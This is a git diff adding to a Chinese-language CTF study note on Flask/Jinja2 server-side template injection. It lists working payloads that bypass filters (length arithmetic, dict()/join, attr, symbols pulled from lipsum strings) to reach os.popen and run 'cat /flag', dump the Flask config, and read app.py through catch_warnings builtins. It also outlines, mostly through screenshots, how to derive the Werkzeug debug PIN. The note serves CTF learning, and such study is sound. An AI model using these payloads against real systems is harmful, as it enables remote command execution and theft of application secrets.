@@ -536,3 +536,256 @@ python语法也可以使用`[]`来访问对象属性
 # length过滤器绕过数字过滤
 
 ![image-20240424231325079](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231325079.png)
+
+
+
+![image-20240424231826968](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231826968.png)
+
+```
+{% set a='aaaa'|length*'aaaaa'|length*'aaaaaaaaaa'|length-'a'|length %}{{''.__class__.__base__.__subclasses__()[a].__init__.__globals__['os']['popen']('cat /flag').read()}}
+```
+
+```
+{% set a='aaaa'|length*'aaaaa'|length*'aaaaaa'|length-'aaa'|length %}{{''.__class__.__base__.__subclasses__()[a].__init__.__globals__['popen']('cat /flag').read()}}
+```
+
+
+
+# 获取config文件
+
+没有过滤时:
+
+`{{config}}`可以直接读取
+
+
+
+![image-20240424234453958](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424234453958.png)
+
+
+
+![image-20240424234832797](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424234832797.png)
+
+
+
+```
+{{url_for.__globals__['current_app'].config}}
+{{get_flashed_messages.__globals__['current_app'].config}}
+```
+
+
+
+# 混合过滤绕过
+
+## dict()和join绕过＋的过滤
+
+dict:
+
+创建字典,键名为`__cla`,键值为`1`
+
+join:
+
+获取键名生成字符串
+
+![image-20240424235806220](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424235806220.png)
+
+
+
+## 获取符号
+
+利用flask内置函数和对象获取符号
+
+![image-20240425000035644](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425000035644.png)
+
+```
+{% set ben=({}|select()|string()) %}{{ben}}
+{% set ben=(self|select()|string()) %}{{ben}}
+{% set ben=(self|string|urlencode) %}{{ben}}
+{% set ben=(app.__doc__|string()) %}{{ben}}
+```
+
+![image-20240425000305054](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425000305054.png)
+
+再使用list将得到的字符串转化成列表,然后按索引拿到符号
+
+![image-20240425000623558](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425000623558.png)
+
+
+
+## 实例解析
+
+### 一
+
+![image-20240425001514687](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425001514687.png)
+
+
+
+```
+{% set a=dict(__class__=a)|join %}{% set b=dict(__base__=a)|join %}{% set c=dict(__subclasses__=a)|join %}{% set d=dict(__getitem__=a)|join %}{% set e=dict(__init__=a)|join %}{% set f=dict(__globals__=a)|join %}{% set g=dict(popen=a)|join %}{{()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)}}
+#到popen为止,不是完整的payload
+```
+
+最终payload如下:
+
+```
+{% set a=dict(__class__=a)|join %}{% set b=dict(__base__=a)|join %}{% set c=dict(__subclasses__=a)|join %}{% set d=dict(__getitem__=a)|join %}{% set e=dict(__init__=a)|join %}{% set f=dict(__globals__=a)|join %}{% set g=dict(popen=a)|join %}{% set kg={}|select()|string()|attr(d)(10) %}{% set i=(dict(cat=a)|join,kg,dict(flag=2)|join)|join %}{% set r=dict(read=a)|join %}{{()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(r)()}}
+```
+
+
+
+### 二
+
+![image-20240425002845277](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425002845277.png)
+
+
+
+![image-20240425003347779](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425003347779.png)
+
+#因为`_`被过滤,所以要用`pop`代替`__getitem__`
+
+![image-20240425003538996](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425003538996.png)
+
+```
+#获取空格
+{% set nine=dict(aaaaaaaaa=a)|join|count %}{% set pop=dict(pop=a)|join %}{% set a=(lipsum|string|list)|attr(pop)(nine) %}{{a}}
+```
+
+最终形式:
+
+![image-20240425004405733](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425004405733.png)
+
+
+
+# debug pin码计算
+
+## pin码
+
+![image-20240425004749951](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425004749951.png)
+
+## pin码生成原理
+
+![image-20240425004822363](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425004822363.png)
+
+
+
+前四个在这里获得:
+
+![image-20240425005318648](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005318648.png)
+
+### **获取用户名username**
+
+![image-20240425005443554](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005443554.png)
+
+### **获取app对象name属性**
+
+![image-20240425005514798](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005514798.png)
+
+### **获取app对象module属性**
+
+![image-20240425005551200](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005551200.png)
+
+### **mod的`__file__`属性**
+
+![image-20240425005632981](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005632981.png)
+
+### **uuid**
+
+![image-20240425005751956](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005751956.png)
+
+### **get_machine_id获取**
+
+![image-20240425005935936](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005935936.png)
+
+
+
+![image-20240425010648994](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010648994.png)
+
+
+
+![image-20240425010722608](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010722608.png)
+
+
+
+python3.10
+
+![image-20240425010758624](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010758624.png)
+
+
+
+python3.6
+
+![image-20240425010818627](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010818627.png)
+
+
+
+python2.7
+
+![image-20240425010840543](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010840543.png)
+
+
+
+# pin码计算ctf题目
+
+## username
+
+![image-20240425011204762](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011204762.png)
+
+
+
+## modname,appname
+
+一般为flask.app和Flask
+
+
+
+## app.py路径
+
+![image-20240425011851084](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011851084.png)
+
+
+
+
+
+
+
+## mac地址(uuid)
+
+![image-20240425011434071](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011434071.png)
+
+判断是centos还是ubantu
+
+![image-20240425011520597](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011520597.png)
+
+成功访问页面返回uuid
+
+mac地址计算时要转换成10进制
+
+
+
+## get_machine_id
+
+![image-20240425011649329](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011649329.png)
+
+把两个拼接起来就是machineid
+
+补充:
+
+![image-20240425172851151](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425172851151.png)
+
+
+
+# 补充payload
+
+```
+{% for c in [].__class__.__base__.__subclasses__() %}
+   {% if c.__name__=='catch_warnings' %}
+    {{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}
+   {% endif %}
+{% endfor %}
+```
+
+```
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
+```
+
+popen被过滤可以使用open
+
